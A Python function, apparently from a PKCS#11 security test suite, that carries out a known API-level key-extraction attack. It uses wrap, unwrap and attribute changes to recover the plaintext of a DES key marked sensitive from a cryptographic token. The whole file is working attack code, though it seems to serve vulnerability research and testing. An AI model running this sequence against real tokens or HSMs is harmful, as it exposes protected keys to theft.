import secrets

from PyKCS11 import Session, Mechanism
from PyKCS11.LowLevel import *


def dks3_attack_des_ecb(session: Session, patched: bool):
    """
    The intruder knows the handles h(n1, k1), h(n2, k2);
    n1 has the attributes sensitive, extract and whereas n2 has the attribute extract set.
    """
    k1 = secrets.token_bytes(8)
    n1_template = [
        (CKA_CLASS, CKO_SECRET_KEY),
        (CKA_KEY_TYPE, CKK_DES),
        (CKA_VALUE, k1),
        (CKA_SENSITIVE, CK_TRUE),
        (CKA_EXTRACTABLE, CK_TRUE),
        (CKA_WRAP, CK_FALSE),
        (CKA_UNWRAP, CK_FALSE),
        (CKA_ENCRYPT, CK_FALSE),
        (CKA_DECRYPT, CK_FALSE),
    ]
    n1 = session.createObject(n1_template)

    n2_template = [
        (CKA_EXTRACTABLE, CK_TRUE),
        (CKA_VALUE_LEN, 8),
        (CKA_WRAP, CK_FALSE),
        (CKA_UNWRAP, CK_TRUE),
        (CKA_ENCRYPT, CK_TRUE),
        (CKA_DECRYPT, CK_FALSE),
    ]
    n2 = session.generateKey(n2_template, Mechanism(CKM_DES_KEY_GEN))

    # Set_wrap: h(n2, k2) → wrap(n2)
    session.setAttributeValue(n2, [(CKA_WRAP, CK_TRUE)])

    # Wrap: h(n2, k2), h(n2, k2) → senc(k2, k2)
    k2_k2 = session.wrapKey(n2, n2, Mechanism(CKM_DES_ECB))

    # Set_unwrap: h(n2, k2) → unwrap(n2)
    session.setAttributeValue(n2, [(CKA_UNWRAP, CK_TRUE)])

    # Unwrap: h(n2, k2), senc(k2, k2) → h(n4, k2)
    template = [
        (CKA_CLASS, CKO_SECRET_KEY),
        (CKA_KEY_TYPE, CKK_DES),
    ]
    n4 = session.unwrapKey(n2, k2_k2, template, Mechanism(CKM_DES_ECB))

    # Wrap: h(n2, k2), h(n1, k1) → senc(k1, k2)
    k1_k2 = session.wrapKey(n2, n1, Mechanism(CKM_DES_ECB))

    # Set_decrypt: h(n4, k2) → decrypt(n4)
    session.setAttributeValue(n4, [(CKA_DECRYPT, CK_TRUE)])

    # SDecrypt: h(n4, k2), senc(k1, k2) → k1
    recovered = session.decrypt(n4, k1_k2[:-8] if patched else k1_k2, Mechanism(CKM_DES_ECB))

    assert k1 == bytes(recovered)
